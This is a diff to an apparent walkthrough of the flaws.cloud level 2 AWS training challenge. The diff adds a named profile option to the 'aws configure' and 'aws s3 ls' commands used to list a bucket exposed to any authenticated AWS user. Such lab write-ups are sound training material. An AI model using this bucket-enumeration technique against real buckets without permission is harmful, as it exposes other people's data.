@@ -44,7 +44,7 @@ Source: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
 With the given objection in hand, it is obvious that this is pretty much similar to the last one. Let's assume that this time, the permission will be granted to "Any Authenticated AWS User" instead of "Everyone".
 1. Configure AWS CLI with the Access Key and Secret Key of the IAM user.
     ```
-    $ aws configure
+    $ aws configure --profile ratnakar
     AWS Access Key ID [None]: ********************
     AWS Secret Access Key [None]: ********************
     Default region name [us-west-2]: us-west-2
@@ -52,7 +52,7 @@ With the given objection in hand, it is obvious that this is pretty much similar
     ```
 2. Then, attempt to browse the bucket using the AWS CLI.
     ```
-    $ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+    $ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile ratnakar
     2017-02-27 07:32:15      80751 everyone.png
     2017-03-03 09:17:17       1433 hint1.html
     2017-02-27 07:34:39       1035 hint2.html
